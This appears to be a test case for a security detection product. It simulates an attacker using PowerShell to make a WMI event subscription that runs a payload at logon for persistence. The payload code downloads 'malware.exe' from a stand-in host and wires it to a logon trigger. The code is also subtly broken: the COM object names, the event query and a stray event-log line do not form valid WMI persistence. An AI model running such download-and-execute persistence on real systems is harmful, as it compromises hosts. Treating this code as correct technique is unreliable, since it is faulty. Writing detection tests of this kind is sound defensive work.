identity.description: An attacker uses PowerShell to create WMI event filters, command line consumers, and bindings to execute a payload on system events and ensure persistence across reboots. Cortex should detect the creation of WMI subscription objects using wmic.exe and powershell.exe.

payload.code:
mkdir C:\temp
wget http://192.0.2.1/malware.exe -OutFile C:\temp\malware.exe
powershell.exe -Command "New-EventLog -LogName Application -Source 'Microsoft-Windows-GroupPolicy'
$Filter = New-Object -ComObject 'WbemScripting.SWbemFilter'
$Filter.Query = 'SELECT * FROM Win32_LogonSession'
$Filter.Name = 'LogonFilter'
$Filter.Put_()
$Consumer = New-Object -ComObject 'WbemScripting.SWbemConsumer'
$Consumer.Name = 'LogonConsumer'
$Consumer.CommandLineTemplate = 'C:\\temp\\malware.exe'
$Consumer.Put_()
$Binding = New-Object -ComObject 'WbemScripting.SWbemBinding'
$Binding.Filter = $Filter
$Binding.Consumer = $Consumer
$Binding.Put_()"
